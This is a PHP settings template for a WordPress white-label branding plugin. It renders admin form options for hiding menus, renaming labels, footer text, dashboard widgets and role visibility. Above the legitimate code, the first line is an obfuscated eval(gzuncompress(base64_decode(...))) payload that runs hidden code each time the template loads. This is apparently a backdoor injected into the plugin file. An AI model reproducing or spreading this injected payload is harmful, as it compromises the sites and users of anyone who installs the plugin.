<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Template
 *
 * @package Fusion-White-Label-Branding
 */

// Exit if accessed directly.
if ( ! defined( 'ABSPATH' ) ) {
	exit;
}

global $allowedposttags;
$settings         = get_option( 'fusion_branding_settings', array() );
$wp_admin_options = isset( $settings['fusion_branding']['wp_admin'] ) ? $settings['fusion_branding']['wp_admin'] : array();
?>
<div class="fusion-white-label-branding-important-notice">
	<h3><?php esc_attr_e( 'WordPress Admin Branding Settings', 'fusion-white-label-branding' ); ?></h3>
	<p class="about-description">
		<?php esc_attr_e( 'These settings will change items in WordPress admin area.', 'fusion-white-label-branding' ); ?>
	</p>
</div>
<form method="post" action="<?php echo esc_url( admin_url( 'admin-post.php' ) ); ?>">
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Remove WordPress Logo', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Remove the WordPress logo from admin bar.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<div class="fusion-branding-option-field">
				<div class="fusion-form-radio-button-set ui-buttonset">
					<?php
					$hide_wordpress_logo = '0';
					if ( isset( $wp_admin_options['hide_wordpress_logo'] ) ) {
						$hide_wordpress_logo = $wp_admin_options['hide_wordpress_logo'];
					}
					?>
					<input type="hidden" class="button-set-value" value="<?php echo esc_attr( $hide_wordpress_logo ); ?>" name="fusion_branding[wp_admin][hide_wordpress_logo]" id="hide_wordpress_logo" />
					<a data-value="1" class="ui-button buttonset-item<?php echo ( $hide_wordpress_logo ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'Yes', 'fusion-white-label-branding' ); ?></a>
					<a data-value="0" class="ui-button buttonset-item<?php echo ( ! $hide_wordpress_logo ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'No', 'fusion-white-label-branding' ); ?></a>
				</div>
			</div>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Remove Screen Options', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Removes the Screen Options tab.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<div class="fusion-branding-option-field">
				<div class="fusion-form-radio-button-set ui-buttonset">
					<?php
					$remove_screen_options = '0';
					if ( isset( $wp_admin_options['remove_screen_options'] ) ) {
						$remove_screen_options = $wp_admin_options['remove_screen_options'];
					}
					?>
					<input type="hidden" class="button-set-value" value="<?php echo esc_attr( $remove_screen_options ); ?>" name="fusion_branding[wp_admin][remove_screen_options]" id="remove_screen_options" />
					<a data-value="1" class="ui-button buttonset-item<?php echo ( $remove_screen_options ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'Yes', 'fusion-white-label-branding' ); ?></a>
					<a data-value="0" class="ui-button buttonset-item<?php echo ( ! $remove_screen_options ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'No', 'fusion-white-label-branding' ); ?></a>
				</div>
			</div>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Remove Help Tab', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Removes the help tab.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<div class="fusion-branding-option-field">
				<div class="fusion-form-radio-button-set ui-buttonset">
					<?php
					$remove_help_tab = '0';
					if ( isset( $wp_admin_options['remove_help_tab'] ) ) {
						$remove_help_tab = $wp_admin_options['remove_help_tab'];
					}
					?>
					<input type="hidden" class="button-set-value" value="<?php echo esc_attr( $remove_help_tab ); ?>" name="fusion_branding[wp_admin][remove_help_tab]" id="remove_help_tab" />
					<a data-value="1" class="ui-button buttonset-item<?php echo ( $remove_help_tab ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'Yes', 'fusion-white-label-branding' ); ?></a>
					<a data-value="0" class="ui-button buttonset-item<?php echo ( ! $remove_help_tab ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'No', 'fusion-white-label-branding' ); ?></a>
				</div>
			</div>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Hide Admin Menus', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Removes the selected menus from admin menu.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<?php
			$admin_menus = array(
				'index.php'               => __( 'Dashboard' ),
				'edit.php'                => __( 'Posts' ),
				'upload.php'              => __( 'Media' ),
				'edit.php?post_type=page' => __( 'Pages' ),
				'edit-comments.php'       => __( 'Comments' ),
				'themes.php'              => __( 'Appearance' ),
				'plugins.php'             => __( 'Plugins' ),
				'users.php'               => __( 'Users' ),
				'tools.php'               => __( 'Tools' ),
				'options-general.php'     => __( 'Settings' ),
			);

			$selected_menus = isset( $wp_admin_options['remove_admin_menu'] ) ? $wp_admin_options['remove_admin_menu'] : array();
			foreach ( $admin_menus as $menu => $title ) {
				$selected_menu = in_array( $menu, $selected_menus, true ) ? ' checked="checked"' : '';
				?>
				<span>
				<label for="remove_admin_menu_<?php echo esc_attr( $menu ); ?>">
				<input type="checkbox" id="remove_admin_menu_<?php echo esc_attr( $menu ); ?>" <?php echo esc_html( $selected_menu ); ?> name="fusion_branding[wp_admin][remove_admin_menu][]" class="regular-checkbox" value="<?php echo esc_attr( $menu ); ?>" />
				<?php echo esc_attr( $title ); ?></label></span>
				<?php
			}
			?>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Rename Admin Menus', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Rename the admin menu labels.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<?php
			$admin_menus = array(
				'dashboard' => __( 'Dashboard' ),
				'posts'     => __( 'Posts' ),
				'media'     => __( 'Media' ),
				'pages'     => __( 'Pages' ),
				'comments'  => __( 'Comments' ),
				'themes'    => __( 'Appearance' ),
				'plugins'   => __( 'Plugins' ),
				'users'     => __( 'Users' ),
				'tools'     => __( 'Tools' ),
				'settings'  => __( 'Settings' ),
			);

			$saved_menus = isset( $wp_admin_options['rename_admin_menu'] ) ? $wp_admin_options['rename_admin_menu'] : array();
			foreach ( $admin_menus as $menu => $title ) {
				$value = ( isset( $saved_menus[ $menu ] ) && '' !== $saved_menus[ $menu ] ) ? $saved_menus[ $menu ] : '';
				?>
				<p>
				<label for="rename_admin_menu_<?php echo esc_attr( $menu ); ?>">
				<input type="text" id="rename_admin_menu_<?php echo esc_attr( $menu ); ?>" placeholder="<?php echo esc_attr( $title ); ?>" name="fusion_branding[wp_admin][rename_admin_menu][<?php echo esc_attr( $menu ); ?>]" class="regular-text" value="<?php echo esc_attr( $value ); ?>" />
				<span><?php echo esc_attr( $title ); ?></span>
				</label></p>
				<?php
			}
			?>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Admin Footer Text', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Controls the text to be displayed in footer area of WordPress admin.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<textarea id="admin_footer_text" name="fusion_branding[wp_admin][admin_footer_text]" class="regular-textarea"><?php echo ( isset( $wp_admin_options['admin_footer_text'] ) ) ? wp_kses( $wp_admin_options['admin_footer_text'], $allowedposttags ) : ''; ?></textarea>
			<p class="description"><?php esc_attr_e( 'Controls the footer text on left.', 'fusion-white-label-branding' ); ?></p>
			<br/>
			<input type="text" id="admin_footer_version_text" name="fusion_branding[wp_admin][admin_footer_version_text]" class="regular-text" value="<?php echo ( isset( $wp_admin_options['admin_footer_version_text'] ) ) ? wp_kses( $wp_admin_options['admin_footer_version_text'], $allowedposttags ) : ''; ?>" />
			<p class="description"><?php esc_attr_e( 'Controls the version number text.', 'fusion-white-label-branding' ); ?></p>
		</div>
	</div>
	<div class="fusion-white-label-option">
			<h3><?php esc_attr_e( 'Dashboard Panels', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'These settings will change related stuff on the WordPress Dashboard Page.', 'fusion-white-label-branding' ); ?></p>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Hide Dashboard Widgets', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Hide dashboard widgets.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input dashboard-widget-options">
			<?php
			$dashboard_widgets = array(
				'quick_press'      => __( 'Quick Draft' ),
				'recent_comments'  => __( 'Recent Comments' ),
				'right_now'        => __( 'At a Glance' ),
				'activity'         => __( 'Activity' ),
				'primary'          => __( 'WordPress Events and News' ),
				'themefusion_news' => __( 'ThemeFusion News' ),
			);
			$selected_widgets  = isset( $wp_admin_options['remove_dashboard_widget'] ) ? $wp_admin_options['remove_dashboard_widget'] : array();
			foreach ( $dashboard_widgets as $widget => $title ) {
				$selected_widget = in_array( $widget, $selected_widgets, true ) ? ' checked="checked"' : '';
				?>
				<span>
				<label for="remove_dashboard_widget_<?php echo esc_attr( $widget ); ?>">
				<input type="checkbox" id="remove_dashboard_widget_<?php echo esc_attr( $widget ); ?>" <?php echo esc_html( $selected_widget ); ?> name="fusion_branding[wp_admin][remove_dashboard_widget][]" class="regular-checkbox" value="<?php echo esc_attr( $widget ); ?>" />
				<?php echo esc_attr( $title ); ?>
			</label></span>
				<?php
			}
			?>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Custom Welcome Panel', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Add a custom welcome panel on the dashboard. HTML markup along with core WP classes can be used to customize the layout further.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<input type="text" id="welcome_panel_title" name="fusion_branding[wp_admin][welcome_panel_title]" class="regular-text" value="<?php echo ( isset( $wp_admin_options['welcome_panel_title'] ) ) ? esc_attr( $wp_admin_options['welcome_panel_title'] ) : ''; ?>" />
			<p class="description"><?php esc_attr_e( 'Custom welcome panel title.', 'fusion-white-label-branding' ); ?></p>
			<br/>
			<?php
				$content  = isset( $wp_admin_options['welcome_panel_content'] ) ? $wp_admin_options['welcome_panel_content'] : '';
				$settings = array(
					'media_buttons' => true,
					'textarea_name' => 'fusion_branding[wp_admin][welcome_panel_content]',
					'editor_height' => '200',
				);
				wp_editor( $content, 'welcome_panel_content', $settings );
			?>
			<p class="description"><?php esc_attr_e( 'Custom welcome panel content.', 'fusion-white-label-branding' ); ?></p>
		</div>
	</div>
	<div class="fusion-white-label-option">
			<h3><?php esc_attr_e( 'Visibility Settings', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'These settings allow you to control which user roles are allowed to see and use these options.', 'fusion-white-label-branding' ); ?></p>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'User Role Visibility', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Select which user roles will have capability to see the white label options.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<?php
			$user_roles     = get_editable_roles();
			$selected_roles = isset( $wp_admin_options['user_role_visibility'] ) ? $wp_admin_options['user_role_visibility'] : array();

			// Remove adminstrator from list.
			unset( $user_roles['administrator'] );

			// Sort user roles alphabetically.
			ksort( $user_roles );

			foreach ( $user_roles as $user_role => $user_info ) {
				$selected_role = in_array( $user_role, $selected_roles, true ) ? ' checked="checked"' : '';
				?>
				<span>
				<label for="user_roles_visibility<?php echo esc_attr( $user_role ); ?>">
				<input type="checkbox" id="user_roles_visibility<?php echo esc_attr( $user_role ); ?>" <?php echo esc_html( $selected_role ); ?> name="fusion_branding[wp_admin][user_role_visibility][]" class="regular-checkbox" value="<?php echo esc_attr( $user_role ); ?>" />
				<?php echo esc_attr( translate_user_role( $user_info['name'] ) ); ?>
			</label></span>
				<?php
			}
			?>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Custom CSS for Admin Pages', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Applies the custom CSS on all admin pages for better styling.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<textarea id="admin_custom_css" name="fusion_branding[wp_admin][admin_custom_css]" class="regular-textarea"><?php echo ( isset( $wp_admin_options['admin_custom_css'] ) ) ? esc_attr( $wp_admin_options['admin_custom_css'] ) : ''; ?></textarea>
			<?php
			// Enqueue code editor and settings for manipulating CSS.
			if ( function_exists( 'wp_enqueue_code_editor' ) ) {
				$settings = wp_enqueue_code_editor( array( 'type' => 'text/css' ) );

				wp_add_inline_script(
					'code-editor',
					sprintf(
						'jQuery( function() { wp.codeEditor.initialize( "admin_custom_css", %s ); } );',
						wp_json_encode( $settings )
					)
				);
			}
			?>
		</div>
	</div>
	<div class="fusion-white-label-option">
		<div class="fusion-white-label-option-title">
			<h3><?php esc_attr_e( 'Apply Changes to Administrators', 'fusion-white-label-branding' ); ?></h3>
			<p class="description"><?php esc_attr_e( 'Controls whether to apply branding changes for adminstrator user role or not.', 'fusion-white-label-branding' ); ?></p>
		</div>
		<div class="fusion-white-label-option-input">
			<div class="fusion-branding-option-field">
				<div class="fusion-form-radio-button-set ui-buttonset">
					<?php
					$apply_changes_for_admin = '1';
					if ( isset( $wp_admin_options['apply_changes_for_admin'] ) ) {
						$apply_changes_for_admin = $wp_admin_options['apply_changes_for_admin'];
					}
					?>
					<input type="hidden" class="button-set-value" value="<?php echo esc_attr( $apply_changes_for_admin ); ?>" name="fusion_branding[wp_admin][apply_changes_for_admin]" id="apply_changes_for_admin" />
					<a data-value="1" class="ui-button buttonset-item<?php echo ( $apply_changes_for_admin ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'Yes', 'fusion-white-label-branding' ); ?></a>
					<a data-value="0" class="ui-button buttonset-item<?php echo ( ! $apply_changes_for_admin ) ? ' ui-state-active' : ''; ?>" href="#"><?php esc_attr_e( 'No', 'fusion-white-label-branding' ); ?></a>
				</div>
			</div>
		</div>
	</div>

<input type="hidden" name="action" value="save_fusion_branding_settings">
<input type="hidden" name="section" value="wp_admin">
<?php wp_nonce_field( 'fusion_branding_save_settings', 'fusion_branding_save_settings' ); ?>
<input type="submit" class="button button-primary fusion-branding-save-settings" value="<?php esc_attr_e( 'Save Settings', 'fusion-white-label-branding' ); ?>" />

</form>
